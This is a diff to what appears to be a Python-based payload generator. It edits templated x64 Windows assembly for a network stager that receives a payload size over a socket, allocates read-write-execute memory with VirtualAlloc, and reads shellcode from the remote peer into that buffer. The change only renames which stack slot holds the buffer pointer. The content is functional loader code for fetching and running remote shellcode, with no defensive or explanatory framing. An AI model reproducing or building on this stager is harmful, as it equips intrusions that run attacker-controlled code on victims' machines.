@@ -156,7 +156,6 @@ call_connect:
 
     xor rdx, rdx
     mov [rbp - {self.storage_offsets['lpvShellcode']}], rdx
-    mov [rbp - {self.storage_offsets['pResponse']}], rdx
 
 call_recv_size:
     mov rcx, [rbp - {self.storage_offsets['sockfd']}]
@@ -167,7 +166,7 @@ call_recv_size:
     call rax
 
 call_VirtualAlloc:
-    mov rcx, [rbp - {self.storage_offsets['pResponse']}]
+    mov rcx, [rbp - {self.storage_offsets['lpvShellcode']}]
     mov rdx, [rbp - {self.storage_offsets['dwSize']}]
     mov r8, {winnt.MEM_COMMIT | winnt.MEM_RESERVE}
     mov r9, {winnt.PAGE_EXECUTE_READWRITE}
@@ -175,11 +174,10 @@ call_VirtualAlloc:
     call rax
 
     mov [rbp - {self.storage_offsets['lpvShellcode']}] , rax
-    mov [rbp - {self.storage_offsets['pResponse']}], rax
 
 call_recv_payload:
     mov rcx, [rbp - {self.storage_offsets['sockfd']}]
-    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
+    mov rdx, [rbp - {self.storage_offsets['lpvShellcode']}]
     mov r8, [rbp - {self.storage_offsets['dwSize']}]
     xor r9, r9
     mov rax, [rbp - {self.storage_offsets['recv']}]
